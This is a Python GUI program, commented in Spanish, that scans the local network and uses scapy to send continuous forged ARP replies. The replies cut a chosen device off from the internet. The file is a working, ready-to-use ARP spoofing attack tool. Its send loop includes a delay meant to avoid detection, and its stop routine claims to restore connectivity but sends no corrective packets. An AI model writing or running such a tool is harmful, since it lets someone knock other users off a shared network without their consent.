import threading
import time
import scapy.all as scapy
import customtkinter as ctk
from tkinter import messagebox, ttk
import netifaces

# Configuración de la interfaz gráfica
ctk.set_appearance_mode("dark")  # Modo oscuro
ctk.set_default_color_theme("blue")

class ARPSpooferApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Bloqueador de IP en Tiempo Real")
        self.geometry("500x500")
        self.resizable(False, False)
        
        self.router_ip = self.obtener_router_ip()
        
        ctk.CTkLabel(self, text="Seleccione o ingrese la IP a bloquear", font=("Arial", 16)).pack(pady=10)
        
        # Contenedor de entrada y selección de IP
        frame = ctk.CTkFrame(self)
        frame.pack(pady=5, padx=10, fill='x')
        
        self.ip_entry = ctk.CTkEntry(frame, width=200, placeholder_text="Ingrese IP manualmente")
        self.ip_entry.pack(side='left', padx=5)
        
        self.ip_combo = ttk.Combobox(frame, state="readonly", width=20)
        self.ip_combo.pack(side='left', padx=5)
        
        self.bloquear_btn = ctk.CTkButton(self, text="Iniciar Bloqueo", command=self.iniciar_ataque)
        self.bloquear_btn.pack(pady=10)
        
        self.desbloquear_btn = ctk.CTkButton(self, text="Detener Bloqueo", fg_color="red", command=self.detener_ataque)
        self.desbloquear_btn.pack(pady=10)
        
        self.status_label = ctk.CTkLabel(self, text="", font=("Arial", 12))
        self.status_label.pack(pady=10)
        
        self.running = False
        
        self.scan_network()

    def obtener_router_ip(self):
        """Obtiene automáticamente la IP del router desde la configuración de red."""
        try:
            gateway = netifaces.gateways().get("default", {}).get(netifaces.AF_INET, [None])[0]
            if gateway:
                return gateway
            else:
                messagebox.showerror("Error", "No se pudo obtener la IP del router. Se usará 192.168.1.1 por defecto.")
                return "192.168.1.1"
        except KeyError:
            messagebox.showerror("Error", "No se pudo determinar la IP del router.")
            return "192.168.1.1"

    def scan_network(self):
        """Escanea la red y obtiene todas las IPs activas para mostrarlas en la lista desplegable."""
        self.ip_combo['values'] = []
        iface = netifaces.gateways()['default'][netifaces.AF_INET][1]  # Obtener interfaz de red activa
        ip_range = f"{self.router_ip}/24"  # Detectar el rango de IP automáticamente
        ans, _ = scapy.arping(ip_range, timeout=1, verbose=False)
        devices = [rcv.psrc for _, rcv in ans]
        self.ip_combo['values'] = devices
        if devices:
            self.ip_combo.current(0)
        else:
            self.ip_combo.set("No se encontraron dispositivos")

    def spoof(self, target_ip, spoof_ip):
        """Envia paquetes ARP Spoofing para desconectar la IP del internet."""
        target_mac = self.obtener_mac(target_ip)
        if target_mac is None:
            messagebox.showerror("Error", "No se pudo obtener la MAC del objetivo")
            return
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        while self.running:
            scapy.send(packet, verbose=False)
            time.sleep(2 + (time.time() % 1))  # Pequeño retraso aleatorio para evitar detección

    def obtener_mac(self, ip):
        """Obtiene la dirección MAC de la IP objetivo."""
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        if answered_list:
            return answered_list[0][1].hwsrc
        return None

    def iniciar_ataque(self):
        """Inicia el ataque ARP Spoofing en la IP seleccionada o ingresada."""
        target_ip = self.ip_entry.get().strip() or self.ip_combo.get().strip()
        if not target_ip or "No se encontraron dispositivos" in target_ip:
            messagebox.showwarning("Error", "Debe ingresar o seleccionar una IP válida")
            return
        self.running = True
        self.status_label.configure(text=f"Bloqueando {target_ip} 🚫", text_color="red")
        self.attack_thread = threading.Thread(target=self.spoof, args=(target_ip, self.router_ip))
        self.attack_thread.start()
        messagebox.showinfo("Éxito", f"El dispositivo con IP {target_ip} está bloqueado.")

    def detener_ataque(self):
        """Detiene el ataque y restaura la conexión."""
        self.running = False
        self.status_label.configure(text="Ataque detenido ✅", text_color="green")
        messagebox.showinfo("Éxito", "El dispositivo ha recuperado la conexión.")

if __name__ == "__main__":
    app = ARPSpooferApp()
    app.mainloop()